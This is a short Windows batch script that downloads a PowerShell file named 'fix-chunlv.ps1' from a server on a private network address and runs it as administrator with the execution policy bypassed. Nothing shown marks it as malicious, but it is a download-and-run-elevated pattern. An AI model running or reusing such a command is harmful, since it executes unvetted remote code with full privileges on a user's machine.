@echo off
chcp 65001 >nul
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; $p=Join-Path $env:TEMP 'fix-chunlv.ps1'; Invoke-WebRequest -Uri 'http://192.168.0.106:3001/uploads/fix-chunlv.ps1' -OutFile $p -UseBasicParsing; Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-File',$p"
